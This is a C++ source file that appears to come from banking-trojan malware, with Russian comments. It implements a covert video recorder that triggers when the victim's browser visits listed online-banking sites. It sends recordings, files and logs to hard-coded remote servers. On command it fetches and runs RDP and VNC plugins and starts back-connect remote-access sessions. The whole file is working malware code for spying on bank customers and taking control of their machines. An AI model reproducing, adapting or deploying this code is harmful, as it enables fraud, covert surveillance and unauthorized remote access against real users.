#include "VideoRecorder.h"
#include "BotCore.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "Pipes.h"
#include "Inject.h"
#include "StrConsts.h"
#include "plugins.h"
#include "BackConnect.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace VIDEORECDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>

//----------------------------------------------------------------------------


/// список отлавливаемых адресов. В случае рабочей копии должен заканчиваться
//  двойным нулём
#ifndef DEBUGCONFIG
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = VIDEOREC_PARAM_NAME_URLS;
#else
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = "*bsi.dll*\0"
												  "*ibank.alfabank.ru*\0"
												  "*avangard.ru*\0\0";
#endif


#define HASH_VIDEO_REC_URLS 0x9189212B /* VIDEO_REC_URLS */


#ifdef DEBUGCONFIG
//	char VIDEO_REC_HOST1[] = "178.162.179.65";
//	char VIDEO_REC_HOST2[] = "188.72.202.163";

//	char VIDEO_REC_HOST1[] = "127.0.0.1";
//	char VIDEO_REC_HOST2[] = "127.0.0.1";
	char VIDEO_REC_HOST1[] = "192.168.0.100";
	char VIDEO_REC_HOST2[] = "192.168.0.100";
//	char VIDEO_REC_HOST1[] = "192.168.147.2";
//	char VIDEO_REC_HOST2[] = "193.106.161.242";
#else
	//Адрес сервера куда пишем видео
	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
	char VIDEO_REC_HOST2[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST2;
#endif


#define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */


namespace VideoRecorder
{
	// Подключаем код библиотеки
	#include "VideoRecorderDll.cpp"
}


//*****************************************************************************
//                                    TVideoRecDLL
//*****************************************************************************
TVideoRecDLL::TVideoRecDLL()
	: TMemoryDLL(VideoRecorder::data)
{
	// Загружаем библиотеку и инициализируем апи
	InitializeApi();
}
//-------------------------------------------------------------------

TVideoRecDLL::~TVideoRecDLL()
{

}
//-------------------------------------------------------------------

void TVideoRecDLL::LoadFunc(const char* Name, LPVOID &Addr)
{
	// Функция загружает функцию библиотеки
	// Функция расчитывает на то, что строка Name зашифрована
	Addr = GetProcAddress(GetStr(Name));
}
//-------------------------------------------------------------------

void TVideoRecDLL::InitializeApi()
{
	LoadFunc(VideoRecFuncInit,			(LPVOID&)Init);
	LoadFunc(VideoRecFuncRelease,		(LPVOID&)Release);
	LoadFunc(VideoRecFuncAddIPServer,	(LPVOID&)AddIPServer);
	LoadFunc(VideoRecFuncRecordProcess,	(LPVOID&)RecordProcess);
	LoadFunc(VideoRecFuncRecordWnd,		(LPVOID&)RecordWnd);
	LoadFunc(VideoRecFuncStop,			(LPVOID&)RecordStop);
	LoadFunc(VideoRecFuncResetTimer,	(LPVOID&)ResetTimer);
	LoadFunc(VideoRecFuncSendFiles,		(LPVOID&)SendFiles);
	LoadFunc(VideoRecFuncSendFilesAsync,(LPVOID&)StartSendAsync);
	LoadFunc(VideoRecFuncIsSendedAsync,	(LPVOID&)IsSendedAsync);
	LoadFunc(VideoRecFuncRunCmdExec,	(LPVOID&)RunCmdExec);
	LoadFunc(VideoRecFuncSendLog,		(LPVOID&)SendLog);
}

//*********************************************************************************
//							VideoSendLog
//*********************************************************************************
//отправка лога на сервер:
//name - имя лога
//code - код лога
//format - форматированный текст лога
void VideoLog::Send( const char* name, int code, const char* format, ... )
{
	if( format != 0 )
	{
		va_list va;
		va_start( va, format );
		SendV( name, code, format, va );
		va_end(va);
	}
	else
		Send2( name, code, format );
}

void VideoLog::SendV( const char* name, int code, const char* format, va_list va )
{
	char buf[1024];
	pwvsprintfA( buf, format, va );
	Send2( name, code, buf );
}

void VideoLog::Send( int code, const char* format, ... )
{
	va_list va;
	va_start( va, format );
	SendV( name, code, format, va );
	va_end(va);
}

void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
{
	// Проверяем адрес в браузере и, в случае нужного, запускаем запись
	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
		return;

	PCHAR URL = NULL;

	if (!STR::IsEmpty((PCHAR)Data))
	{
		PCHAR Temp = VIDEO_REC_URLS;
		while (*Temp != 0)
		{
			if (CompareUrl(Temp, (PCHAR)Data))
			{
				URL = Temp;
				break;
			}

			//--------------------
			Temp = STR::End(Temp); // Переходим к концу строки
			Temp++;                // Пропускаем нулевой символ
		}
    }


	if (URL != NULL)
	{
		VideoProcess::RecordPID( 0, URL );
	}
	else
	{
		VideoProcess::RecordStop();
	}
}


void StartVideoFromCurrentURL()
{
	#ifdef UniversalKeyLoggerH
 		VDRDBG("VideoRecorder", "Инициализируем видеорекордер для записи при нужных адресах");

		KeyLogger::Initialize(NULL);
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}

PCHAR GetVideoRecHost1()
{
	//Функция возвращает адрес сервера для записи видео
	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST1;
}

PCHAR GetVideoRecHost2()
{
	//Функция возвращает адрес сервера для записи видео
	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST2;
}



bool SaveVideoDll( const char* nameFile )
{
	void* dataDll;
	DWORD sizeDll;
	bool neededDel;
	if( TMemoryDLL::DecodeDll( VideoRecorder::data, sizeDll, dataDll, neededDel ) )
	{
		bool res = File::WriteBufferA( (char*)nameFile, dataDll, sizeDll ) > 0;
		if( neededDel ) MemFree(dataDll);
		return res;
	}
	return false;
}

/////////////////////////////////////////////////////////////////////////////
//						VideoProcess
/////////////////////////////////////////////////////////////////////////////

namespace VideoProcess
{

TVideoRecDLL* dll; //экземпляр либы
PProcessPipe pipe; //канал пайпа
const int MaxServers = 10; //максимальное количество обновременно работающих серверов 
DWORD servers[MaxServers];

DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );

//инициализация (запуск) нового менеджера 
struct MsgInit
{
	char ip[16];
	int port;
	int flags;
	int downtime; //время бездействия после которого менеджер уходит в режим спячки
	int numServer; //номер сервера (индекс в servers), 
};

static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(VideoProcess::MsgInit) ) 
		return;
	MsgInit* mi = (MsgInit*)Message->Data;
	VDRDBG( "Video", "init server: ip: %s:%d, downtime %d", mi->ip, mi->port, mi->downtime );
	int num = -1;
	for( int i = 0; i < MaxServers; i++ ) //ищем свободное место в массиве серверов
		if( servers[i] == 0 )
			num = i;
	if( num >= 0 )
	{
		DWORD id = dll->Init( Bot->UID().t_str(), mi->flags, mi->ip, mi->port, mi->downtime );
		if( id )
		{
			int i = 0;
			for( ; i < MaxServers; i++ ) //смотрим может уже инициализирован такой сервер
				if( servers[i] == id )
				{
					num = i;
					break;
				}
			if( i >= MaxServers ) //такой сервер уже подключен
			{
				servers[num] = id;
				if( mi->flags & TVideoRecDLL::RunCallback )
					dll->RunCmdExec( id, CallbackCmd ); //запуск потока выполнения команд от сервера
			}
		}
		else
			num = -1;
	}
	mi->numServer = num;
}

int Init( int flags, const char* ip, int port, int downtime )
{
	MsgInit msg;
	SafeCopyStr( msg.ip, sizeof(msg.ip), ip );
	msg.port = port == 0 ? VIDEORECORD_DEFAULT_PORT : port;
	msg.flags = flags;
	msg.downtime = downtime;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncInit).t_str(), (char*)&msg, sizeof(msg), 0 );
	return msg.numServer;
}

//сообщение для записи видео
struct MsgRecordVideo
{
	char nameVideo[128]; //имя видео
	HWND wnd; //если != 0, то запись указанного окна
	DWORD pid; //если != 0, то запись с окон указанного процесса
	int flags; //0x0001 - полноэкранная запись, 0x0002 - записывать всегда, даже если окно не активно
	int seconds; //сколько секунд писать видео
	int numServer;
};
//функция обработчик стартует запись видео
static void WINAPI HandlerRecordVideo( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(VideoProcess::MsgRecordVideo) ) 
		return;
	MsgRecordVideo* msg = (MsgRecordVideo*)Message->Data;
	VDRDBG( "Video", "start name video: %s, wnd: %08x, pid: %08x", msg->nameVideo, msg->wnd, msg->pid );
	if( dll )
	{
		if( msg->wnd )
			dll->RecordWnd( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->wnd, msg->seconds, msg->flags );
		else if( msg->pid )
			dll->RecordProcess( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->pid, msg->seconds, msg->flags );
	}
}

bool RecordHWND( int server, const char* name, HWND wnd, int seconds, int flags )
{
	MsgRecordVideo msg;
	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
	msg.wnd = wnd;
	msg.pid = 0;
	msg.flags = flags;
	msg.seconds = seconds;
	msg.numServer = server;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
	return true;
}

bool RecordPID( int server, const char* name, DWORD pid, int seconds, int flags )
{
	MsgRecordVideo msg;
	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
	msg.wnd = 0;
	if( pid == 0 ) pid = GetUniquePID();
	msg.pid = pid;
	msg.flags = flags;
	msg.seconds = seconds;
	msg.numServer = server;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
	return true;
}

//функция обработчик останавливает запись видео
static void WINAPI HandlerStopRecord( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	VDRDBG( "Video", "stop video" );
	if( dll )
		dll->RecordStop();
}

void RecordStop()
{
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncStop).t_str() );
}

///////////////////////////////////////////////////////////////////////////////////////
//сообщение для записи файлов
struct MsgSendFiles
{
	char name[128]; //имя записи
	char path[MAX_PATH]; //имя файла или папка которые нужно передать
	int numServer;
	DWORD id; //идентификатор отправки (для проверки в асинхронной отправки)
};

//стартует передачу файлов на сервер
static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
	VDRDBG( "Video", "Start send files %s", msg->path );
	if( dll )
		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->path );
}

DWORD SendFiles( int server, const char* name, const char* path, bool async )
{
	MsgSendFiles msg;
	SafeCopyStr( msg.name, sizeof(msg.name), name );
	SafeCopyStr( msg.path, sizeof(msg.name), path );
	msg.numServer = server;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendFilesAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
	if( async )
		return msg.id;
	else
	{
		while( !FilesIsSended(msg.id) ) pSleep(1000);
	}
	return 0;
}

//////////////////////////////////////////////////////////////////
//проверка окончания передачи файлов
struct MsgFilesIsSended
{
	DWORD id;
	DWORD res;
};

//проверяет закончилась ли отправка файлов
static void WINAPI HandlerFilesIsSended( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgFilesIsSended) ) return;
	MsgFilesIsSended* msg = (MsgFilesIsSended*)Message->Data;
	VDRDBG( "Video", "HandlerFilesIsSended %08x", msg->id );
	if( dll )
		msg->res = dll->IsSendedAsync( msg->id );
}

bool FilesIsSended(DWORD id)
{
	MsgFilesIsSended msg;
	msg.id = id;
	msg.res = FALSE;
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncIsSendedAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
	return msg.res != 0;
}

struct MsgSendLog
{
	char name[128]; //имя лога
	int code; //кода текста лога
	char text[4096 - 256]; //текст лога (большего размера нельзя из-за ограничения размеров отправляемых на сервер пакетов)
	int numServer;
};

//отсылка лога на сервер
static void WINAPI HandlerSendLog( LPVOID Data, PPipeMessage Message, bool &Cancel )
{
	if( Message->DataSize != sizeof(MsgSendLog) ) return;
	MsgSendLog* msg = (MsgSendLog*)Message->Data;
	VDRDBG( "Video", "HandlerSendLog %s, %d, %s", msg->name, msg->code, msg->text );
	if( dll )
		dll->SendLog( servers[msg->numServer], msg->name, msg->code, msg->text );
}

static DWORD WINAPI SendLogThread( void* msg )
{
	char buf[64];
	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendLog).t_str(), (char*)msg, sizeof(MsgSendLog), 0 );
	return 0;
}

//лог отправляет в отдельном потоке, чтобы не было задержки
bool SendLog( int server, const char* name, int code, const char* text )
{
	MsgSendLog* msg = (MsgSendLog*)MemAlloc( sizeof(MsgSendLog) );
	SafeCopyStr( msg->name, sizeof(msg->name), name );
	msg->code = code;
	SafeCopyStr( msg->text, sizeof(msg->text), text );
	msg->numServer = server;
	RunThread( SendLogThread, msg );
	return true;
}

static DWORD WINAPI ProcessRDP(void*)
{
	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);

	BOT::Initialize(ProcessUnknown);
	DWORD c_data;
	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
	if( data )
	{
		HMEMORYMODULE module = MemoryLoadLibrary(data);
		if( module )
		{
			PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
			PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
			PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
			PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
			if( Init )
			{
				VDRDBG( "Video", "Init RDP" );
				Init(GetStr(RDPRunParam).t_str());
				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //сообщаем что RDP запустился
				Start();
				if( mutex )
				{
					for(;;) // ждем команды на выключение
					{
						HANDLE tmp;
						tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
						if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
							pSleep(100);
						else
							break;
					}
					pCloseHandle(mutex);
				}
				Stop();
				VDRDBG( "Video", "Stop RDP" );
				MemoryFreeLibrary(module);
			}
		}
		MemFree(data);
	}
	return 0;
}

static DWORD WINAPI ProcessVNC(void*)
{
	BOT::Initialize(ProcessUnknown);

	VDRDBG("Video", "Запущен процесс VNC. PID %d", Bot->PID());

	DWORD c_data;
	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );

//	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
	if( data )
	{
		VDRDBG( "Video", "vnc.plug downloaded");
		char fileName[MAX_PATH];
		File::GetTempName(fileName);
		if( File::WriteBufferA(fileName, data, c_data) == c_data)
		{
			VDRDBG( "Video", "vnc.plug saved in %s", fileName );
			if( RunFileA(fileName))
			{
				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
				pSleep(20000); //ждем 20 с пока запустится vnc
				HANDLE mutex = CaptureMutex( "VNC", 10000 ); //сообщаем что VNC запустился
				if( mutex )
				{
					while (true)
					{
						//VDRDBG( "Video", "VNC worked" );
						pSleep(10000);
					}
					pCloseHandle(mutex);
				}
			}
			else
				pDeleteFileA(fileName);
		}
		MemFree(data);
	}
	else
	{
        VDRDBG( "Video", "vnc.plug download error");
	}

				/*
				HMEMORYMODULE module = MemoryLoadLibrary(data);
				if( module )
				{
					TASKDBG( "Task", "Exit HVNC" );
					MemoryFreeLibrary(module);
				}
				*/
	pExitProcess(0);
	return 0;
}

//обработчик команд от видео длл
//server - это не номер индекса в массиве servers, это ид сервере, возвращаемый длл, если нужен номер
//сервера, то нужно пройтись по массиву servers и найти индекс
DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
{
	DWORD res = 0;
	switch( cmd )
	{
		case 21: //загрузка и запуск RDP
			VDRDBG( "Video", "RDP" );
			if( WaitCaptureMutex( "RDP", 100 ) ) //может рдп уже запущен
				outData[0] = 1;
			else
			{
				MegaJump(ProcessRDP);
				if( WaitCaptureMutex( "RDP", 2 * 60 * 1000 ) )
				{
					pSleep(10000); //ждем дополнительно пока стартанет RDP
					outData[0] = 1;
					VDRDBG( "Video", "RDP is start" );
				}
				else
				{
					VDRDBG( "Video", "RDP not start" );
					outData[0] = 0;
				}
			}
			res = TRUE;
			break;
		case 22: //загрузка и запуск VNC
			VDRDBG( "Video", "VNC" );
			if( WaitCaptureMutex( "VNC", 100 ) ) //может внц уже запущен
				outData[0] = 1;
			else
			{
				MegaJump(ProcessVNC);
				if( WaitCaptureMutex( "VNC", 2 * 60 * 1000 ) )
				{
					VDRDBG( "Video", "VNC is start" );
					outData[0] = 1;
				}
				else
				{
					VDRDBG( "Video", "VNC not start" );
					outData[0] = 0;
				}
			}
			res = TRUE;
			break;
		case 23: //запуск BC (back connect)
			{
				VDRDBG( "Video", "BC" );
				int len = (inData[1] << 8) | inData[0];
				char* args = inData + 2;
				args[len] = 0;
				VDRDBG( "Video", "BC %s", args );
				if( ExecuteBackConnectCommand( 0, 0, args) )
					outData[0] = 1;
				else
					outData[0] = 0;
//				if( inData && lenInData == sizeof(SOCKET) ) //в inData находится сокет
//					RunThread( StartBCSessionWork, inData );
			}
			break;
	}
	return res;
}

bool Start()
{
	dll = new TVideoRecDLL();
	m_memset( servers, 0, sizeof(servers) );
	//запускаем менеджер видео процесса в режиме спячки, т. е. соединяться с сервером будет только по команде
	//или при передаче данных
	VDRDBG( "Video", "Start manager ip '%s'", VIDEO_REC_HOST1 );
	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, 0 );
	if( servers[0] )
	{
		VDRDBG( "Video", "Менеджер инициализирован" );
		dll->AddIPServer( servers[0], VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT );
		VDRDBG( "Video", "Add server ip '%s'", VIDEO_REC_HOST2 );
		char namePipe[64];
		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
		if( pipe )
		{
			PIPE::RegisterMessageHandler( pipe, HandlerInit, 0, GetStr(VideoRecFuncInit).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerRecordVideo, 0, GetStr(VideoRecFuncRecordWnd).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerStopRecord, 0, GetStr(VideoRecFuncStop).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerSendFiles, 0, GetStr(VideoRecFuncSendFilesAsync).t_str(), 0 );
			PIPE::RegisterMessageHandler( pipe, HandlerFilesIsSended, 0, GetStr(VideoRecFuncIsSendedAsync).t_str(), 0 );

			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );

			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера

			if( PIPE::StartProcessPipe(pipe) )
			{
				VDRDBG( "Video", "Пайп канал открыт" );
				return true;
			}
			else
				PIPE::FreeProcessPipe(pipe);
		}
	}
	delete dll;
	return false;;
}


char* GetNamePipe( char* buf )
{
	string s = GetStr(VideoRecPipe);
	m_lstrcpy( buf, s.t_str() );
	return buf;
}

}
